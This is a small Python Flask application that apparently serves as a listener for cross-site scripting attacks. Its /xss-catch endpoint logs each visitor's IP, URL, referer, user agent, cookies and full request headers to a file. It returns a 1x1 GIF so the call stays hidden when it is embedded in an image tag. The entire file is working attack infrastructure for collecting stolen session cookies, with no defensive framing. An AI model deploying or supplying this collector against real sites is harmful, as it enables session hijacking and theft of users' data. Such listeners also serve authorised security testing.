from flask import Flask, request
import datetime, os

app = Flask(__name__)

@app.route("/xss-catch")
def catch():
    log_path = "xss_log.txt"
    with open(log_path, "a") as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"[{datetime.datetime.now()}] HIT\n")
        f.write(f"URL:       {request.url}\n")
        f.write(f"IP:        {request.remote_addr}\n")
        f.write(f"Referer:   {request.headers.get('Referer', '-')}\n")
        f.write(f"User-Agent:{request.headers.get('User-Agent', '-')}\n")
        f.write(f"Cookies:   {request.headers.get('Cookie', '-')}\n")
        f.write(f"All hdrs:  {dict(request.headers)}\n")

    # Also return a 1x1 pixel so the page doesn't error if used in <img>
    return b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;", 200, {
        "Content-Type": "image/gif"
    }

@app.route("/")
def home():
    return "Listener is running!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
